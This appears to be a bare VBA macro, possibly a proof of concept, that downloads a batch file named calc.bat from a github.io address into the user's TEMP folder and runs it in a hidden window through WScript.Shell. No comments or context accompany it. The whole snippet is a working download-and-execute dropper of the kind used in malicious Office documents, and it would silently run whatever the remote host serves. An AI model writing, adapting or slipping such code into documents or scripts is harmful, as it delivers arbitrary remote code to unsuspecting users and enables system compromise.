Dim xHttp, bStrm, filePath

filePath = Environ("TEMP") & "\calc.bat"

Set xHttp = CreateObject("MSXML2.XMLHTTP")
xHttp.Open "GET", "https://james-sapphire.github.io/calc.bat", False
xHttp.Send

Set bStrm = CreateObject("ADODB.Stream")
bStrm.Type = 1
bStrm.Open
bStrm.Write xHttp.ResponseBody
bStrm.SaveToFile filePath, 2
bStrm.Close

Set oShell = CreateObject("WScript.Shell")
oShell.Run Chr(34) & filePath & Chr(34), 0, False
